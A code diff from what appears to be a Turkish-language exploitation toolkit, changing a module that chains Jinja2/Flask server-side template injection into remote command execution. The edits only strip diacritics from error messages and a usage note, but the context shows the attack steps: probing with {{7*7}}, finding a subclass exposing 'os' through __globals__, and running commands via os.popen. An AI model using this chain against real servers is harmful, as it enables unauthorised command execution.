@@ -52,7 +52,7 @@ _WORKERS = 16
 def _parse(params):
     url = (params.get("url") or params.get("host") or "").strip()
     if not url:
-        raise ValueError("hedef url gerekli (örn. http://127.0.0.1:5000/greet)")
+        raise ValueError("hedef url gerekli (orn. http://127.0.0.1:5000/greet)")
     t = _net.parse_target(url if "://" in url else "http://" + url, default_port=80)
     method = (params.get("method") or "GET").upper()
     param = params.get("param") or "name"
@@ -144,13 +144,13 @@ def ssti_rce(params) -> dict:
     if not ssti:
         return {**out, "status": status,
                 "evidence": body.strip()[:2000],
-                "error": "SSTI doğrulanamadı ({{7*7}} -> 49 yok). Hedef şablon enjeksiyonuna kapalı olabilir."}
+                "error": "SSTI dogrulanamadi ({{7*7}} -> 49 yok). Hedef sablon enjeksiyonuna kapali olabilir."}
 
     # 2) discover an os-bearing subclass index
     idx = _discover(params)
     if idx < 0:
         return {**out, "status": 200, "evidence": body.strip()[:2000],
-                "error": "SSTI doğrulandı ama __init__.__globals__['os'] içeren bir sınıf bulunamadı (RCE zinciri bu ortamda kurulamadı)."}
+                "error": "SSTI dogrulandi ama __init__.__globals__['os'] iceren bir sinif bulunamadi (RCE zinciri bu ortamda kurulamadi)."}
     out["log"].append(f"os-bearing subclass index = {idx}")
 
     # 3) RCE
@@ -183,9 +183,9 @@ _COMMON_INPUTS = [
     _in("Metot", "method", False, "GET", "GET"),
 ]
 
-_NOTE = ("Jinja2/Flask SSTI->RCE (native). Kanıt = komut çıktısı (uid=) HTTP yanıtında. "
-         "os.popen(cmd).read() ile stdout yakalanır (os.system stdout'a basar, HTTP'te görünmez). "
-         "os-bearing sınıf indeksi hedefe göre keşfedilir (ortam-bağımsız).")
+_NOTE = ("Jinja2/Flask SSTI->RCE (native). Kanit = komut ciktisi (uid=) HTTP yanitinda. "
+         "os.popen(cmd).read() ile stdout yakalanir (os.system stdout'a basar, HTTP'te gorunmez). "
+         "os-bearing sinif indeksi hedefe gore kesfedilir (ortam-bagimsiz).")
 
 
 def _spec(name, cve_desc):
